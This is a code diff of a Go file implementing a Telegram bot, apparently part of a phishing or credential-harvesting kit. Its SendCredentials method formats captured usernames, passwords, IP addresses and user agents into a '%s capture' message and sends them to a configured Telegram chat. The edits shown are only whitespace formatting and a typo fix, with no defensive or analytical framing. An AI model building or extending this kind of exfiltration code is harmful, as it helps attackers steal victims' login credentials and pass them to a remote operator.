@@ -17,13 +17,13 @@ import (
 )
 
 type TelegramBot struct {
-	botToken    string
-	chatID      string
-	enabled     bool
-	client      *http.Client
-	msgQueue    chan *TelegramMessage
-	wg          sync.WaitGroup
-	stopChan    chan bool
+	botToken string
+	chatID   string
+	enabled  bool
+	client   *http.Client
+	msgQueue chan *TelegramMessage
+	wg       sync.WaitGroup
+	stopChan chan bool
 }
 
 type TelegramMessage struct {
@@ -114,7 +114,7 @@ func (t *TelegramBot) SendCredentials(sessionID int, username, password, ip, use
 	}
 
 	timestamp := time.Now().Format("2006-01-02 15:04:05 MST")
-	
+
 	message := fmt.Sprintf(
 		"%s capture\n\n"+
 			"📧 Username: %s\n\n"+
@@ -155,7 +155,7 @@ func (t *TelegramBot) SendFormattedSession(sessionID int, formattedMessage strin
 	msg := &TelegramMessage{
 		ChatID:    t.chatID,
 		Text:      formattedMessage,
-		ParseMode: "",  // No markdown parsing for custom format
+		ParseMode: "", // No markdown parsing for custom format
 	}
 
 	select {
@@ -209,12 +209,12 @@ func (t *TelegramBot) SendTestMessage() error {
 	message := "Telegram Integration Test\n\n" +
 		"This is a test message to verify your Telegram bot configuration.\n\n" +
 		"If you receive this message, your bot is properly configured!\n\n" +
-		"letthsi be the message for telegram test"
+		"let this be the message for telegram test"
 
 	msg := &TelegramMessage{
 		ChatID:    t.chatID,
 		Text:      message,
-		ParseMode: "",  // No markdown parsing for plain text
+		ParseMode: "", // No markdown parsing for plain text
 	}
 
 	// Send test message directly without queuing
